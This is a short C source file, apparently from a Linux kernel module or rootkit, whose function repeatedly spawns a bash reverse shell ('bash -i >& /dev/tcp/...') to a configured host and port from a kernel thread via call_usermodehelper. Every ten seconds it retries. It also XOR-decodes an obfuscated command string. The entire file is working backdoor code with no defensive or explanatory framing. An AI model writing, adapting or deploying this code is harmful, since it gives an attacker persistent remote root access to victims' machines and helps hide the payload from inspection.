#include "tasks/reverse_shell.h"

void xor_decrypt(char* s) {
    for (; *s != '\0'; ++s) {
        *s ^= XOR_KEY;
    }
}

int rshell_func(void* data) {
    if (RSHELL_CMD_OBF[0] == '\0') {
        pr_info("its empty");
        return 0;
    }
    char command[256];
    snprintf(command, sizeof(command), "bash -i >& /dev/tcp/%s/%s 0>&1", RSHELL_HOST, RSHELL_PORT);

    char xor_cmd[] = RSHELL_CMD_OBF;
    xor_decrypt(xor_cmd);
    pr_info("hey %s", xor_cmd);

    char* argv[] = { "/bin/bash", "-c", command, NULL };
    static char* envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
        while (!kthread_should_stop()) {
            call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
            ssleep(10);
        }

    return 0;
}